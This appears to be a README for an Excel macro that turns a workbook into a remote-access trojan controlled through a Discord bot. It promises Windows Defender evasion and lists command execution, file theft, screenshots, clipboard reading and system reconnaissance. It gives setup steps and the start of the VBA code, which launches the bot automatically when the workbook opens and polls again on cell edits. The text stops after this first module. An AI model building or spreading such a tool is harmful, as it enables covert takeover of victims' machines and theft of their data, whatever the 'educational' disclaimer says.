# Microsoft-Excel-VBA-Discord-C2
This project help us to learn how Microsoft Excel file can give us command and control and bypass windows defender.
This script turns an Excel workbook into a remote administration tool that polls a Discord channel for commands, executes them on a Windows machine (e.g., a VirtualBox VM), and returns the output to Discord.

**⚠️ DISCLAIMER:** This project is for **educational purposes only**. It demonstrates API integration, WMI queries, and shell execution in VBA. Do not use this on machines you do not own.

## 🚀 Features
- **Asynchronous Polling:** Checks Discord for new messages every 5 seconds without freezing Excel.
- **Command Execution:** Run CMD commands, launch executables.
- **File Transfer:** Download files from Discord to the VM (`!upload`), and upload files from the VM to Discord (`!download`).
- **System Recon:** Dump OS, CPU, RAM, BIOS, and Network info (`!sysinfo`).
- **Geolocation:** Fetch public IP location data (`!location`).
- **Screen Capture:** Take screenshots and upload them directly to Discord.
- **Utility:** Read clipboard, change directory, list files, lock workstation.

## 🛠️ Prerequisites
1. Microsoft Excel (Desktop version, not Web).
2. A Discord Server and a Discord Bot Token.
3. [VBA-JSON Library](https://github.com/VBA-tools/VBA-JSON) (`JsonConverter.bas`).
4. **Microsoft Scripting Runtime** reference enabled in VBA.

## 📦 Installation

### 1. Discord Bot Setup
1. Go to the [Discord Developer Portal](https://discord.com/developers/applications).
2. Create an App, go to **Bot**, and copy the Token.
3. Enable **Message Content Intent** under Privileged Gateway Intents.
4. Invite the bot to your server with permissions: `Send Messages`, `Read Message History`, `Attach Files`, `Add Reactions`.
5. Enable Developer Mode in Discord settings. Right-click your text channel -> **Copy Channel ID**. Right-click your name -> **Copy User ID**.

### 2. Excel Setup
1. Open Excel, save a new file as **Excel Macro-Enabled Workbook (*.xlsm)**.
2. Press `Alt + F11` to open the VBA Editor.
3. Go to `Tools > References` and check **Microsoft Scripting Runtime**.
4. Download `JsonConverter.bas` from the VBA-JSON repo and import it via `File > Import File`.

### 3. Inserting the Code
Create the following files in the VBA Editor and paste the code provided below.

---

## 💻 The Code

### 1. ThisWorkbook (Microsoft Excel Objects)
```vba
Option Explicit
Public gBot As DiscordBot

Private Sub Workbook_Open()
    Set gBot = New DiscordBot
    gBot.StartListening
End Sub

Private Sub Workbook_BeforeClose(Cancel As Boolean)
    If Not gBot Is Nothing Then
        gBot.StopListening
        Set gBot = Nothing
    End If
End Sub

' Force an immediate poll when the user finishes editing a cell
Private Sub Workbook_SheetChange(ByVal Sh As Object, ByVal Target As Range)
    ForceBotPoll
End Sub

Private Sub Workbook_SheetSelectionChange(ByVal Sh As Object, ByVal Target As Range)
    ForceBotPoll
End Sub

Private Sub ForceBotPoll()
    On Error Resume Next
    If Not gBot Is Nothing Then
        If gBot.IsRunning Then gBot.PollForCommands
    End If
End Sub
